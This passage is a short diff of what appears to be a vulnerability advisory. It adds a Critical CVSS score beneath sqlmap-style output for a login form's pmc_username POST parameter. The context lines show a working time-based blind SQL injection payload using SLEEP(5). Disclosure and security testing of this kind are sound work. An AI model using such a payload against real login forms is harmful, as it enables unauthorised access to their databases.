@@ -56,3 +56,5 @@ Parameter: pmc_username (POST)
     Payload: L=english&Link=&LIMIT=0&pmc_username=test' AND (SELECT 5588 FROM (SELECT(SLEEP(5)))wWnk)-- FHPh&pmc_password=test&login_form=Log In
 ---
 ````
+
+CVSS Score: https://cvssjs.github.io/#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L (Critical)
